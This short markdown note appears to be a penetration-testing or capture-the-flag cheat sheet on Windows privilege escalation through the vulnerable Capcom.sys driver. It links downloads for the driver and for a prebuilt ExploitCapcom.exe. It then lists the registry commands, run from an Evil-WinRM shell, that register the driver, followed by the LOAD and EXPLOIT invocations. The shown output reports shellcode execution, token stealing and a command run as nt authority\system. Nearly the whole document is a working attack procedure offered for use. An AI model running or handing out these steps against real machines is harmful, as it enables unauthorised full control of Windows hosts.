# Exploit (exe file) and sys file

- [Capcom.sys (mega.nz)](https://mega.nz/file/GiBTmCRD#cRz3XWMEojDvrd0LHPE3GpXKkYdikITvco8qKwmdgzQ)
- [ExploitCapcom.exe (github - clubby789)](https://github.com/clubby789/ExploitCapcom/releases/tag/1.0)


# Usage

make a new registry:

```
*Evil-WinRM* PS C:\Users\svc-print> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\svc-print\Capcom.sys"
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc-print> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type  /t REG_DWORD /d 1
The operation completed successfully.
```

load the Capcom.sys:

```
.\ExploitCapcom.exe LOAD C:\Windows\Temp\Capcom.sys

[*] Service Name: esfdtwdd
```

execute command as system:

```
.\ExploitCapcom.exe EXPLOIT whoami

[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000020F083F0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
```
